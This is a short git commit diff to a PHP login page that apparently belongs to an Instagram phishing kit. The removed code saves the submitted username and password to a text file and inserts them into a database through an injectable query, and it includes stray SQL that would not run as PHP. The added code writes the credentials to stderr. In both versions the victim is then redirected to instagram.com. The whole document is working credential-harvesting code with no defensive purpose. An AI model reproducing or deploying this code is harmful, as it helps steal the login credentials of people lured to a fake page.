9a57bfaf7cb58fab5cdba709b0d398581654d3b9
mittalkunal47 <mittalkunal47@gmail.com>
2020-07-21 11:01:01 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,10 +1,4 @@
 <?php
-require_once("connection.php");
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-CREATE TABLE USER_DATA (
-	account_id VARCHAR ( 50 ) UNIQUE NOT NULL,
-	password VARCHAR ( 50 ) NOT NULL
-);
-mysql_query("insert into USER_DATA set account_id='".$_POST['username']."',password='".$_POST['password']."'") or die("user already exits");
+file_put_contents("php://stderr", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n");
 header('Location: https://instagram.com');
 exit();
